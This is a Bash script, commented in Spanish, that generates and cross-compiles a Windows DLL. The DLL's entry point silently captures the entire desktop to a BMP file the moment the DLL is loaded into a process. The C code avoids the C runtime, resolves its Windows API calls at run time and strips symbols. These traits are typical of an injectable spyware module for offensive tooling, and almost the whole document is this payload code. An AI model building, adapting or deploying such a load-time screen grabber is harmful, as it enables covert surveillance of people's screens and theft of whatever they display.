#!/bin/bash

# === CONFIGURACIÓN POR DEFECTO ===
DEFAULT_FILENAME="screenshot.bmp"

# Variables que pueden ser sobrescritas por argumentos
FILENAME="$DEFAULT_FILENAME"

# === USO ===
usage() {
    echo "Usage: $0 [--filename <nombre_archivo>]"
    echo "Ejemplo:"
    echo "  $0                        # Usa nombre por defecto: screenshot.bmp"
    echo "  $0 --filename captura.bmp # Guarda como captura.bmp"
    exit 1
}

# === PARSING DE ARGUMENTOS ===
while [[ $# -gt 0 ]]; do
    case "$1" in
        --filename)
            if [[ -z "$2" || "$2" =~ ^-- ]]; then
                echo "[-] Error: --filename requiere un valor."
                usage
            fi
            FILENAME="$2"
            shift 2
            ;;
        *)
            echo "Opción desconocida: $1"
            usage
            ;;
    esac
done

# Validación mínima
if [[ -z "$FILENAME" ]]; then
    echo "[-] Nombre de archivo no puede estar vacío."
    exit 1
fi

# === GENERAR module.c ===
cat > module.c << EOF
// module.c - Captura de pantalla 100% API de Windows (sin CRT)
#include <windows.h>

// Estructuras BMP (empaquetadas)
#pragma pack(push, 1)
typedef struct {
    unsigned short type;      // 'BM'
    unsigned int size;
    unsigned short reserved1;
    unsigned short reserved2;
    unsigned int offset;
} BMPHeader;

typedef struct {
    unsigned int size;
    int width;
    int height;
    unsigned short planes;
    unsigned short bits_per_pixel;
    unsigned int compression;
    unsigned int image_size;
    int x_pixels_per_meter;
    int y_pixels_per_meter;
    unsigned int colors_used;
    unsigned int colors_important;
} DIBHeader;
#pragma pack(pop)

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call != DLL_PROCESS_ATTACH) return TRUE;

    // Obtener contexto del escritorio
    HDC (WINAPI * pGetDC)(HWND) = (void*)GetProcAddress(GetModuleHandleA("user32.dll"), "GetDC");
    int (WINAPI * pGetSystemMetrics)(int) = (void*)GetProcAddress(GetModuleHandleA("user32.dll"), "GetSystemMetrics");
    HDC (WINAPI * pCreateCompatibleDC)(HDC) = (void*)GetProcAddress(GetModuleHandleA("gdi32.dll"), "CreateCompatibleDC");
    HBITMAP (WINAPI * pCreateCompatibleBitmap)(HDC, int, int) = (void*)GetProcAddress(GetModuleHandleA("gdi32.dll"), "CreateCompatibleBitmap");
    HGDIOBJ (WINAPI * pSelectObject)(HDC, HGDIOBJ) = (void*)GetProcAddress(GetModuleHandleA("gdi32.dll"), "SelectObject");
    BOOL (WINAPI * pBitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD) = (void*)GetProcAddress(GetModuleHandleA("gdi32.dll"), "BitBlt");
    int (WINAPI * pGetDIBits)(HDC, HBITMAP, UINT, UINT, LPVOID, BITMAPINFO*, UINT) = (void*)GetProcAddress(GetModuleHandleA("gdi32.dll"), "GetDIBits");
    BOOL (WINAPI * pDeleteObject)(HGDIOBJ) = (void*)GetProcAddress(GetModuleHandleA("gdi32.dll"), "DeleteObject");
    BOOL (WINAPI * pDeleteDC)(HDC) = (void*)GetProcAddress(GetModuleHandleA("gdi32.dll"), "DeleteDC");
    BOOL (WINAPI * pReleaseDC)(HWND, HDC) = (void*)GetProcAddress(GetModuleHandleA("user32.dll"), "ReleaseDC");

    if (!pGetDC || !pGetSystemMetrics || !pCreateCompatibleDC || !pCreateCompatibleBitmap ||
        !pSelectObject || !pBitBlt || !pGetDIBits || !pDeleteObject || !pDeleteDC || !pReleaseDC) {
        return FALSE;
    }

    // Obtener métricas de pantalla
    int width = pGetSystemMetrics(0);   // SM_CXSCREEN = 0
    int height = pGetSystemMetrics(1);  // SM_CYSCREEN = 1

    HDC hdcScreen = pGetDC(NULL);
    if (!hdcScreen) return FALSE;

    // Crear contexto en memoria
    HDC hdcMem = pCreateCompatibleDC(hdcScreen);
    if (!hdcMem) {
        pReleaseDC(NULL, hdcScreen);
        return FALSE;
    }

    // Crear bitmap compatible
    HBITMAP hBitmap = pCreateCompatibleBitmap(hdcScreen, width, height);
    if (!hBitmap) {
        pDeleteDC(hdcMem);
        pReleaseDC(NULL, hdcScreen);
        return FALSE;
    }

    // Seleccionar bitmap en el contexto
    pSelectObject(hdcMem, hBitmap);

    // Copiar pantalla al bitmap
    pBitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, 0x00CC0020); // SRCCOPY

    // Preparar para extraer píxeles
    BITMAPINFO bmi = {0};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height;  // Top-down DIB
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 24;
    bmi.bmiHeader.biCompression = 0;   // BI_RGB

    // Reservar memoria sin CRT: usar HeapAlloc
    HANDLE hHeap = GetProcessHeap();
    unsigned char* pixel_data = (unsigned char*)HeapAlloc(hHeap, 0, width * height * 3);
    if (!pixel_data) {
        pDeleteObject(hBitmap);
        pDeleteDC(hdcMem);
        pReleaseDC(NULL, hdcScreen);
        return FALSE;
    }

    // Obtener píxeles
    pGetDIBits(hdcMem, hBitmap, 0, height, pixel_data, &bmi, 0); // DIB_RGB_COLORS = 0

    // === GUARDAR COMO ARCHIVO BMP SIN CRT ===
    HANDLE (WINAPI * pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE) = 
        (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateFileA");
    BOOL (WINAPI * pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED) = 
        (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteFile");
    BOOL (WINAPI * pCloseHandle)(HANDLE) = 
        (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");

    if (!pCreateFileA || !pWriteFile || !pCloseHandle) {
        HeapFree(hHeap, 0, pixel_data);
        pDeleteObject(hBitmap);
        pDeleteDC(hdcMem);
        pReleaseDC(NULL, hdcScreen);
        return FALSE;
    }

    HANDLE hFile = pCreateFileA("$FILENAME", 0x40000000, 0, NULL, 2, 0, NULL); // GENERIC_WRITE, CREATE_ALWAYS
    if (hFile == (HANDLE)-1) {
        HeapFree(hHeap, 0, pixel_data);
        pDeleteObject(hBitmap);
        pDeleteDC(hdcMem);
        pReleaseDC(NULL, hdcScreen);
        return FALSE;
    }

    int row_padded = (width * 3 + 3) & (~3);  // Alineado a 4 bytes
    int padding = row_padded - width * 3;
    int img_size = row_padded * height;

    // Cabeceras BMP
    BMPHeader bmp = {0};
    bmp.type = 0x4D42;  // 'BM'
    bmp.size = 54 + img_size;
    bmp.offset = 54;

    DIBHeader dib = {0};
    dib.size = 40;
    dib.width = width;
    dib.height = height;
    dib.planes = 1;
    dib.bits_per_pixel = 24;
    dib.compression = 0;
    dib.image_size = img_size;

    DWORD written;
    pWriteFile(hFile, &bmp, sizeof(BMPHeader), &written, NULL);
    pWriteFile(hFile, &dib, sizeof(DIBHeader), &written, NULL);

    // Escribir píxeles (invertir orden de filas: BMP es bottom-up)
    for (int y = height - 1; y >= 0; y--) {
        for (int x = 0; x < width; x++) {
            int src_offset = (y * width + x) * 3;
            unsigned char b = pixel_data[src_offset + 2];  // B
            unsigned char g = pixel_data[src_offset + 1];  // G
            unsigned char r = pixel_data[src_offset + 0];  // R
            pWriteFile(hFile, &b, 1, &written, NULL);
            pWriteFile(hFile, &g, 1, &written, NULL);
            pWriteFile(hFile, &r, 1, &written, NULL);
        }
        // Añadir padding al final de cada fila
        for (int p = 0; p < padding; p++) {
            unsigned char zero = 0;
            pWriteFile(hFile, &zero, 1, &written, NULL);
        }
    }

    pCloseHandle(hFile);

    // Limpiar
    HeapFree(hHeap, 0, pixel_data);
    pDeleteObject(hBitmap);
    pDeleteDC(hdcMem);
    pReleaseDC(NULL, hdcScreen);

    return TRUE;
}
EOF

echo "[+] Archivo C generado: module.c"

# === COMPILAR COMO DLL ===
echo "[*] Compilando module.dll..."

x86_64-w64-mingw32-gcc module.c -o module.dll -shared -s \
  -nostdlib -nodefaultlibs -lkernel32 -lgdi32 -luser32 \
  -e DllMain 2>/dev/null

if [ $? -ne 0 ]; then
    echo "[-] Error al compilar el código C."
    exit 1
fi

echo "[+] Compilación exitosa: module.dll"
echo "[*] Archivo de salida: $FILENAME"